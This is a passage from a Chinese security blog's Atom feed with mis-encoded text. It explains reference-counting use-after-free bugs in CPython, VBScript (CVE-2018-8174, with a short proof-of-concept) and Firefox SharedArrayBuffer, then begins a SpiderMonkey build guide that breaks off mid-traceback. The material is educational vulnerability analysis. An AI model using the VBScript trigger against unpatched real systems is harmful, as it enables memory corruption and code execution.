  </entry>
  
  <entry>
    <title>å¼•ç”¨è®¡æ•°ç›¸å…³æ¼æ´æ¡ˆä¾‹</title>
    <link href="http://programlife.net/2019/07/03/reference-counting-vulnerability/"/>
    <id>http://programlife.net/2019/07/03/reference-counting-vulnerability/</id>
    <published>2019-07-03T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><strong>åƒåœ¾åˆ†ç±»</strong> æ˜¯æœ€è¿‘éå¸¸ç«çˆ†çš„ä¸€ä¸ªè¯é¢˜ï¼Œå…¶ç»å¸¸å‡ºç°åœ¨å„ç§æ–°é—»æŠ¥é“ä¸­ï¼Œç¢°å·§çš„æ˜¯ç¬”è€…æœ€è¿‘ä¹Ÿåœ¨ç ”ç©¶ <strong>åƒåœ¾å›æ”¶</strong> ï¼Œä½†æ­¤åƒåœ¾éå½¼åƒåœ¾ï¼Œç¬”è€…ç ”ç©¶çš„æ˜¯ç¨‹åºè®¾è®¡è¯­è¨€ä¸­çš„ <strong>Garbage Collection</strong>ï¼ˆä¸‹æ–‡ç®€ç§° <strong>GC</strong>ï¼‰ã€‚</p><p>å…³äº GC çš„å…¥é—¨è¯»ç‰©ï¼Œè¿™é‡Œå¼ºçƒˆæ¨èæ—¥æœ¬äººåœ¨ 2010 å¹´å‡ºç‰ˆçš„ä¹¦ç±ã€Š<strong>åƒåœ¾å›æ”¶çš„ç®—æ³•ä¸å®ç°</strong>ã€‹ã€‚ç¬”è€…åœ¨é˜…è¯»è¯¥ä¹¦çš„éƒ¨åˆ†å†…å®¹æ—¶ï¼Œåˆšå¥½æƒ³åˆ°äº†å‡ ä¸ªç›¸å…³çš„æ¼æ´ï¼Œå› æ­¤å†™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹ã€‚</p><a id="more"></a><h2 id="0x01-Python-ææ„å‡½æ•°"><a href="#0x01-Python-ææ„å‡½æ•°" class="headerlink" title="0x01. Python ææ„å‡½æ•°"></a>0x01. Python ææ„å‡½æ•°</h2><p>Python åŸºäºå¼•ç”¨è®¡æ•°æ¥å®ç° GC ç®—æ³•ã€‚åœ¨å¼•ç”¨è®¡æ•°æ³•ä¸­ï¼Œå„ä¸ªå¯¹è±¡çš„å†…éƒ¨éƒ½æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºå¼•ç”¨è®¡æ•°çš„æˆå‘˜ï¼Œä»¥åŠç›¸åº”çš„æ“ä½œå‡½æ•° <code>inc_ref_count</code> å’Œ <code>dec_ref_count</code> æ¥å¢å‡å¼•ç”¨è®¡æ•°ã€‚ç‰¹åˆ«çš„ï¼Œå¦‚æœåœ¨ <code>dec_ref_count</code> ä¸­ï¼Œå¼•ç”¨è®¡æ•°é€’å‡ä¹‹åç­‰äºé›¶ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å°±éœ€è¦è¢«å›æ”¶æ‰äº†ã€‚</p><p>åœ¨ Python ä¸­å®šä¹‰ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå¯ä»¥é€šè¿‡ <code>__init__</code> å®šä¹‰æ„é€ å‡½æ•°ã€é€šè¿‡ <code>__del__</code> å®šä¹‰ææ„å‡½æ•°ã€‚åœ¨å¼•ç”¨è®¡æ•°å˜ä¸º <code>0</code> ä¹‹åã€é”€æ¯å¯¹è±¡ä¹‹å‰ï¼ŒPython ä¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦å®šä¹‰äº† <code>__del__</code> å‡½æ•°ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è°ƒç”¨ä¹‹ã€‚ç›¸å…³çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">slot_tp_del</span><span class="params">(PyObject *self)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> PyObject *del_str = <span class="literal">NULL</span>;</span><br><span class="line">    PyObject *del, *res;</span><br><span class="line">    </span><br><span class="line">    self-&gt;ob_refcnt = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* å¦‚æœæœ‰ __del__ å°±æ‰§è¡Œå®ƒ */</span></span><br><span class="line">    del = lookup_maybe(self, <span class="string">"__del__"</span>, &amp;del_str);</span><br><span class="line">    <span class="keyword">if</span> (del != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        res = PyEval_CallObject(del, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* çœç•¥éƒ¨åˆ†ï¼šé”™è¯¯æ£€æŸ¥å’Œåå¤„ç†ç­‰ */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (--self-&gt;ob_refcnt == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">/* é€€å‡ºå‡½æ•° */</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* çœç•¥éƒ¨åˆ†ï¼šæœ€ç»ˆåŒ–æ—¶æœ‰å¼•ç”¨çš„æƒ…å†µä¸‹çš„åº”å¯¹å¤„ç† */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨è¿›å…¥ <code>slot_tp_del</code> ä¹‹å‰ï¼Œå¯¹è±¡çš„å¼•ç”¨è®¡æ•°å·²ç»ä¸º <code>0</code> äº†ï¼Œä½†æ˜¯åœ¨è¯¥å‡½æ•°ä¸­ï¼Œåœ¨è°ƒç”¨ <code>__del__</code> å‡½æ•°ä¹‹å‰å°†å¼•ç”¨è®¡æ•°é‡æ–°è®¾ç½®ä¸º <code>1</code> ï¼Œè€Œåœ¨è°ƒç”¨ä¹‹ååˆ™å°†å¼•ç”¨è®¡æ•°å‡å» <code>1</code> å¹¶åˆ¤æ–­ç»“æœæ˜¯å¦ä¸º <code>0</code> ï¼Œè¿™é‡Œä¸»è¦æ˜¯åˆ¤æ–­åœ¨è°ƒç”¨ <code>__del__</code> çš„è¿‡ç¨‹ä¸­æ˜¯å¦åˆäº§ç”Ÿäº†æ–°çš„å¼•ç”¨ã€‚</p><p>åƒè¿™æ ·çš„åˆ¤æ–­æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œå¦‚æœæ²¡æœ‰è¿™æ ·çš„åˆ¤æ–­ï¼Œé‚£ä¹ˆåé¢å¯èƒ½å°±ç›´æ¥æŠŠå¯¹è±¡å›æ”¶äº†ï¼Œè€Œå¦‚æœ <code>__del__</code> ä¸­äº§ç”Ÿäº†æ–°çš„å¼•ç”¨ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> ã€‚</p><h2 id="0x02-VBScript-Class-Terminate-UAF"><a href="#0x02-VBScript-Class-Terminate-UAF" class="headerlink" title="0x02. VBScript Class_Terminate UAF"></a>0x02. VBScript Class_Terminate UAF</h2><p>CVE-2018-8174 æ˜¯ VBScript <code>Class_Terminate</code> å‡½æ•°ï¼ˆææ„å‡½æ•°ï¼‰ä¸­å¼•ç”¨è®¡æ•°å¤„ç†ä¸å½“å¯¼è‡´çš„ UAF æ¼æ´ï¼Œæ¼æ´çš„ç»†èŠ‚å¯ä»¥å‚è€ƒ <a href="https://www.anquanke.com/post/id/170727" target="_blank" rel="noopener">å®‰å…¨å®¢</a> å’Œ <a href="https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/" target="_blank" rel="noopener">å¡å·´æ–¯åŸº</a> çš„åˆ†ææ–‡ç« ã€‚æ¼æ´çš„ PoC ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> arr(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">Dim</span> o</span><br><span class="line"></span><br><span class="line"><span class="keyword">Class</span> MyClass</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">Class_Terminate</span></span><br><span class="line">        <span class="keyword">Set</span> o = arr(<span class="number">0</span>)</span><br><span class="line">        arr(<span class="number">0</span>) = &amp;h12345678</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> arr(<span class="number">0</span>) = <span class="keyword">new</span> MyClass</span><br><span class="line"><span class="keyword">Erase</span> arr</span><br><span class="line"></span><br><span class="line"><span class="comment">' Trigger UAF</span></span><br><span class="line"><span class="built_in">MsgBox</span> o</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨æ¸…ç©ºæ•°ç»„æ—¶ï¼Œä¼šä¾æ¬¡æ¸…ç©ºæ•°ç»„ä¸­çš„å…ƒç´ ã€‚<code>arr(0)</code> ä¿å­˜äº† <code>MyClass</code> å¯¹è±¡çš„å¼•ç”¨ï¼Œå› æ­¤æœ€ç»ˆä¼šè§¦å‘ <code>MyClass</code> çš„ææ„å‡½æ•°ï¼Œè€Œåœ¨è¯¥ææ„å‡½æ•°ä¸­åˆé‡æ–°å¼•ç”¨äº†å¯¹è±¡æœ¬èº«ï¼›ç”±äº VBScript å¼•æ“æ²¡æœ‰å¤„ç†å¥½è¿™ç§æƒ…å†µï¼Œè¿™é‡Œå¯¹è±¡ä¼šè¢«å›æ”¶ï¼Œåç»­å†æ¬¡ä½¿ç”¨å¯¹è±¡æ—¶ä¾¿ä¼šè§¦å‘ UAF ã€‚</p><p>è¿™é‡Œè§¦å‘æ¼æ´çš„æ¨¡å¼ï¼Œå’Œä¸Šé¢æåˆ°çš„ Python ä»£ç éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯è¿™é‡Œ VBScript å¼•æ“å¹¶æ²¡æœ‰è€ƒè™‘åˆ°å¯¹è±¡åœ¨ææ„å‡½æ•°ä¸­è¢«é‡æ–°å¼•ç”¨è¿™ä¸€æƒ…å†µã€‚</p><h2 id="0x03-æ•´æ•°æº¢å‡ºé—®é¢˜"><a href="#0x03-æ•´æ•°æº¢å‡ºé—®é¢˜" class="headerlink" title="0x03. æ•´æ•°æº¢å‡ºé—®é¢˜"></a>0x03. æ•´æ•°æº¢å‡ºé—®é¢˜</h2><p>å¤§å®¶å¯èƒ½ä¼šæƒ³ï¼Œå¼•ç”¨è®¡æ•°ä¸ä¼šå­˜åœ¨æ•´æ•°æº¢å‡ºé—®é¢˜å—ï¼Ÿç†è®ºä¸Šæ˜¯å¯ä»¥çš„ï¼Œä½†å®é™…ä¸Šé€šå¸¸ä¸ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼</p><p>å¼•ç”¨è®¡æ•°å™¨çš„ç±»å‹å¯ä»¥ä½¿ç”¨ <strong>å¹³å°ç›¸å…³</strong> çš„æ•´æ•°ç±»å‹ï¼Œæ¯”å¦‚ <code>32</code> ä½ç¯å¢ƒä¸‹ä½¿ç”¨ <code>32</code> ä½çš„è®¡æ•°å™¨ï¼Œ<code>64</code> ä½ç¯å¢ƒä¸‹ä½¿ç”¨ <code>64</code> ä½çš„å¯„å­˜å™¨ã€‚è¿™é‡Œä»¥å‰è€…ä¸ºä¾‹åˆ†ææº¢å‡ºæ—¶çš„æƒ…å†µï¼š</p><p>å‡å¦‚ä½¿ç”¨æ— ç¬¦å·ç±»å‹çš„å¼•ç”¨è®¡æ•°ï¼Œé‚£ä¹ˆè¦å­˜åœ¨ <code>2^32</code> ä¸ªå¼•ç”¨æ‰ä¼šäº§ç”Ÿæº¢å‡ºï¼Œè¿™é‡Œ <code>2^32 = 4GB</code> ï¼›è€Œäº§ç”Ÿä¸€ä¸ªå¼•ç”¨è®¡æ•°è‡³å°‘è¦å ç”¨ä¸€å®šçš„å†…å­˜ï¼ˆæ¯”å¦‚åœ¨è„šæœ¬è¯­è¨€ä¸­å®šä¹‰ä¸€ä¸ªå˜é‡ï¼‰ï¼Œå³ä¾¿æ˜¯ <code>4</code> å­—èŠ‚å°±éœ€è¦å ç”¨ <code>16GB</code> çš„å†…å­˜ï¼Œè€Œå®é™…æƒ…å†µåˆ™è‚¯å®šæ˜¯ <code>16GB</code> çš„æ•°å€ã€‚</p><p>åœ¨ <code>32</code> ä½ç¯å¢ƒä¸‹ï¼Œåœ¨è§¦å‘æ•´æ•°æº¢å‡ºå‰ï¼Œæ—©å°±è§¦å‘äº† <strong>OOM</strong> ï¼ˆOut-Of-Memoryï¼‰å¼‚å¸¸ï¼›åœ¨ <code>64</code> ä½ä¸‹ï¼ŒåŒæ ·ä¹Ÿä¼šå¯¼è‡´ OOM ï¼›æ­¤å¤–ï¼Œå®ç°æ•´æ•°æº¢å‡ºçš„æ—¶é—´ï¼Œå¯èƒ½ä¹Ÿæ˜¯éš¾ä»¥æ¥å—çš„ã€‚</p><p>ç›¸å…³æ¡ˆä¾‹å¯ä»¥å‚è€ƒ Firefox çš„ä¸€ä¸ª Issue ï¼š<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1352093" target="_blank" rel="noopener">Use-after-free due to ref counter overflow in CanvasRenderingContext2D</a> ã€‚</p><h2 id="0x04-Firefox-SharedArrayBuffer-UAF"><a href="#0x04-Firefox-SharedArrayBuffer-UAF" class="headerlink" title="0x04. Firefox SharedArrayBuffer UAF"></a>0x04. Firefox SharedArrayBuffer UAF</h2><p>ä¸Šé¢æåˆ°ï¼Œ<strong>é€šå¸¸æƒ…å†µä¸‹</strong> ä¸å­˜åœ¨å¼•ç”¨è®¡æ•°æº¢å‡ºçš„é—®é¢˜ï¼Œä½† <strong>ç‰¹æ®Šæƒ…å†µä¸‹</strong> è¿™ä¹Ÿæ˜¯éœ€è¦è€ƒè™‘çš„ä¸€ä¸ªé—®é¢˜ï¼<a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">Share with care: Exploiting a Firefox UAF with shared array buffers</a> å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚</p><p>æ‰€è°“ç‰¹æ®Šæƒ…å†µï¼Œæ— éå°±æ˜¯åœ¨å¯ä»¥æ¥å—çš„æ—¶é—´æ¶ˆè€—å’Œå†…å­˜å ç”¨çš„æƒ…å†µä¸‹ï¼Œä¸æ–­å¢åŠ å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å¹¶æœ€ç»ˆå¯¼è‡´å…¶æº¢å‡ºçš„æƒ…å†µã€‚</p><p>åœ¨ä¸Šè¿°æ–‡ç« ä¸­æåˆ°ï¼ŒFirefox çš„ <code>SharedArrayBuffer</code> ä½¿ç”¨äº† <code>uint32_t</code> ç±»å‹çš„å¼•ç”¨è®¡æ•°å™¨ï¼Œå¹¶ä¸”ä¸ä¼šæ£€æŸ¥æº¢å‡ºé—®é¢˜ï¼Œè¿™å°±å­˜åœ¨æ•´æ•°æº¢å‡ºçš„å¯èƒ½æ€§ã€‚</p><p>æ­¤å¤–ï¼Œåœ¨ç‰¹å®šçš„æ¼æ´åœºæ™¯ä¸‹ï¼Œåˆ©ç”¨ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker" target="_blank" rel="noopener">Web Worker</a> åºåˆ—åŒ–ï¼ˆä½¿ç”¨ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">ç»“æ„åŒ–å…‹éš†ç®—æ³•</a> ï¼‰<code>SharedArrayBuffer</code> å¯¹è±¡æ—¶ï¼Œå¯ä»¥åœ¨ä¸åˆ›å»ºæ–°çš„ <code>SharedArrayBuffer</code> çš„æƒ…å†µä¸‹ï¼ˆä¹Ÿä¸éœ€è¦å®šä¹‰é¢å¤–çš„å˜é‡ï¼‰å¢åŠ åŸæœ‰ <code>SharedArrayBuffer</code> çš„å¼•ç”¨è®¡æ•°ï¼Œè¿™å°±æ¶ˆé™¤äº†è§¦å‘æ•´æ•°æº¢å‡ºéœ€è¦å ç”¨å¤§é‡å†…å­˜çš„æƒ…å†µã€‚</p><p>æœ€åï¼Œæ–‡ç« ä½¿ç”¨äº†ä¸€ä¸ªå°æŠ€å·§æ¥ç¼©çŸ­è§¦å‘æ¼æ´æ‰€éœ€è¦çš„æ—¶é—´ï¼Œå³é€šè¿‡ <code>postMessage</code> åˆ°è‡ªèº«ï¼ˆä¸æ˜¯å‘é€ç»™å…¶ä»– Web Worker ï¼‰æ¥åˆ›å»ºæŒ‡å‘åŒä¸€ä¸ª <code>SharedArrayBuffer</code> çš„è®¸å¤šå¼•ç”¨ï¼ˆå¯ä»¥å‡å°‘åºåˆ—åŒ–æ—¶çš„å¾ªç¯æ¬¡æ•°ï¼‰ï¼Œæœ€åé€šè¿‡ä¸Šé¢æåˆ°çš„æ¼æ´åœºæ™¯æ¥å¢åŠ  <code>SharedArrayBuffer</code> çš„å¼•ç”¨è®¡æ•°ï¼Œä»¥å®ç°åœ¨å¯æ§çš„æ—¶é—´å†…è§¦å‘å¼•ç”¨è®¡æ•°çš„æ•´æ•°æº¢å‡ºã€‚</p><p>æœ‰äº†ä¸Šè¿°æ¡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡å¼•ç”¨è®¡æ•°çš„æº¢å‡ºæ¥è§¦å‘ UAF æ¼æ´ï¼Œä¹‹åå†é€šè¿‡åˆ©ç”¨ UAF æ¼æ´æ¥å®ç°ä»£ç æ‰§è¡Œã€‚</p><h2 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05. å°ç»“"></a>0x05. å°ç»“</h2><p>ä»¥ä¸Šï¼Œå°±æ˜¯åœ¨å­¦ä¹ åŸºäºå¼•ç”¨è®¡æ•°çš„ GC æ—¶æƒ³åˆ°çš„å‡ ä¸ªæ¼æ´æ¡ˆä¾‹ï¼Œåç»­å¦‚æœ‰æ‰¾åˆ°æ–°çš„æ¡ˆä¾‹å†è¿›è¡Œè¡¥å……ã€‚</p><p><img src="/uploads/201907/gc.gif" alt="Garbage Collector"></p><p>å¬è¯´è¿™æ˜¯ Java çš„åƒåœ¾å›æ”¶ï¼Ÿå“ˆå“ˆå“ˆ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;åƒåœ¾åˆ†ç±»&lt;/strong&gt; æ˜¯æœ€è¿‘éå¸¸ç«çˆ†çš„ä¸€ä¸ªè¯é¢˜ï¼Œå…¶ç»å¸¸å‡ºç°åœ¨å„ç§æ–°é—»æŠ¥é“ä¸­ï¼Œç¢°å·§çš„æ˜¯ç¬”è€…æœ€è¿‘ä¹Ÿåœ¨ç ”ç©¶ &lt;strong&gt;åƒåœ¾å›æ”¶&lt;/strong&gt; ï¼Œä½†æ­¤åƒåœ¾éå½¼åƒåœ¾ï¼Œç¬”è€…ç ”ç©¶çš„æ˜¯ç¨‹åºè®¾è®¡è¯­è¨€ä¸­çš„ &lt;strong&gt;Garbage Collection&lt;/strong&gt;ï¼ˆä¸‹æ–‡ç®€ç§° &lt;strong&gt;GC&lt;/strong&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å…³äº GC çš„å…¥é—¨è¯»ç‰©ï¼Œè¿™é‡Œå¼ºçƒˆæ¨èæ—¥æœ¬äººåœ¨ 2010 å¹´å‡ºç‰ˆçš„ä¹¦ç±ã€Š&lt;strong&gt;åƒåœ¾å›æ”¶çš„ç®—æ³•ä¸å®ç°&lt;/strong&gt;ã€‹ã€‚ç¬”è€…åœ¨é˜…è¯»è¯¥ä¹¦çš„éƒ¨åˆ†å†…å®¹æ—¶ï¼Œåˆšå¥½æƒ³åˆ°äº†å‡ ä¸ªç›¸å…³çš„æ¼æ´ï¼Œå› æ­¤å†™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Garbage Collection" scheme="http://programlife.net/categories/Vulnerability/Garbage-Collection/"/>
    
    
      <category term="å¼•ç”¨è®¡æ•°" scheme="http://programlife.net/tags/%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0/"/>
    
      <category term="åƒåœ¾å›æ”¶" scheme="http://programlife.net/tags/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    
      <category term="GC" scheme="http://programlife.net/tags/GC/"/>
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="VBScript" scheme="http://programlife.net/tags/VBScript/"/>
    
      <category term="Firefox" scheme="http://programlife.net/tags/Firefox/"/>
    
  </entry>
  
  <entry>
    <title>SpiderMonkey ç¼–è¯‘</title>
    <link href="http://programlife.net/2019/05/18/spidermonkey-build/"/>
    <id>http://programlife.net/2019/05/18/spidermonkey-build/</id>
    <published>2019-05-18T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Why"><a href="#0x01-Why" class="headerlink" title="0x01. Why"></a>0x01. Why</h2><p>é“è·¯åƒä¸‡æ¡ï¼Œç¼–è¯‘ç¬¬ä¸€æ¡ï¼</p><p>åœ¨ Windows ä¸Šç¼–è¯‘å¼€æºè½¯ä»¶ï¼Œæ€»æ˜¯æœ‰å„ç§å„æ ·çš„å‘ç­‰ç€å»å¡«ã€‚</p><a id="more"></a><h2 id="0x02-Steps"><a href="#0x02-Steps" class="headerlink" title="0x02. Steps"></a>0x02. Steps</h2><h3 id="2-1-å·¥å…·"><a href="#2-1-å·¥å…·" class="headerlink" title="2.1 å·¥å…·"></a>2.1 å·¥å…·</h3><ul><li>Git</li><li>Mozilla-Build</li><li>CMake</li><li>Visual Studio 2017</li></ul><h3 id="2-2-æ­¥éª¤"><a href="#2-2-æ­¥éª¤" class="headerlink" title="2.2 æ­¥éª¤"></a>2.2 æ­¥éª¤</h3><p>ä½¿ç”¨ Git æ‹‰å–æœ€æ–°çš„æºä»£ç ï¼Œå¦‚æœå¯¹å†å² commit ä¸æ„Ÿå…´è¶£ï¼Œå¯ä»¥é€‰æ‹© <code>--depth 1</code> æ¥åŠ å¿«æ‹‰å–é€Ÿåº¦ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/mozilla/gecko-dev.git</span><br></pre></td></tr></table></figure><p>å®‰è£… <a href="https://ftp.mozilla.org/pub/mozilla/libraries/win32/MozillaBuildSetup-3.2.exe" target="_blank" rel="noopener">Mozilla-Build</a> ï¼Œè¿™ä¼šé…ç½®ä¸€ä¸ªåŸºæœ¬çš„ MinGW32 ç¯å¢ƒï¼›å®‰è£…å®Œæ¯•ä¹‹åï¼Œæ‰“å¼€ Mozilla-Build ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€ªC:\mozilla-build\start-shell.bat</span><br></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ° SpiderMonkey æ‰€åœ¨çš„è·¯å¾„ï¼Œå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ˆå‚è€ƒ <a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/" target="_blank" rel="noopener">Introduction to SpiderMonkey Exploitation</a> ï¼‰ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">autoconf-2.13</span><br><span class="line">mkdir build.asserts</span><br><span class="line"><span class="built_in">cd</span> build.asserts</span><br><span class="line">../configure --host=x86_64-pc-mingw32 --target=x86_64-pc-mingw32 --<span class="built_in">enable</span>-debug</span><br></pre></td></tr></table></figure><p>æç¤ºæ‰¾ä¸åˆ° C ç¼–è¯‘å™¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">checking for the target C compiler... not found</span><br><span class="line">DEBUG: _cc: Trying clang-cl</span><br><span class="line">DEBUG: _cc: Trying gcc</span><br><span class="line">DEBUG: _cc: Trying clang</span><br><span class="line">ERROR: Cannot find the target C compiler</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œä¸è¦æ€¥ç€å»ä¸‹è½½å®‰è£… LLVM ï¼Œå› ä¸ºå®˜æ–¹é¢„ç¼–è¯‘ç‰ˆæœ¬éƒ½æ˜¯æ²¡æœ‰ <code>llvm-config</code> ç»„ä»¶çš„ï¼Œç…§æ ·æ— æ³•ç¼–è¯‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">checking for llvm-config... c:/Users/User\.mozbuild\clang\bin\llvm-config</span><br><span class="line">not found</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 132, in &lt;module&gt;</span><br><span class="line">    sys.exit(main(sys.argv))</span><br><span class="line">  File &quot;../../../configure.py&quot;, line 38, in main</span><br><span class="line">    sandbox.run(os.path.join(os.path.dirname(__file__), &apos;moz.configure&apos;))</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 481, in run</span><br><span class="line">    func(*args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 525, in _value_for</span><br><span class="line">    return self._value_for_depends(obj)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 534, in _value_for_depends</span><br><span class="line">    value = obj.result()</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\util.py&quot;, line 947, in method_call</span><br><span class="line">    cache[args] = self.func(instance, *args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 151, in result</span><br><span class="line">    return self._func(*resolved_args)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/bindgen.configure&quot;, line 322, in basic_bindgen_cflags</span><br><span class="line">    info = check_compiler([clang_path], &apos;C++&apos;, target)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 508, in check_compiler</span><br><span class="line">    info = get_compiler_info(compiler, language)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 455, in get_compiler_info</span><br><span class="line">    result = try_preprocess(compiler, language, check)</span><br><span class="line">  File &quot;d:\gecko-dev\python\mozbuild\mozbuild\configure\__init__.py&quot;, line 1097, in wrapped</span><br><span class="line">    return new_func(*args, **kwargs)</span><br><span class="line">  File &quot;d:/gecko-dev/build/moz.configure/toolchain.configure&quot;, line 371, in try_preprocess</span><br><span class="line">    return try_invoke_compiler(compiler, language, source, [&apos;-E&apos;])</span><br><span class="line">  File 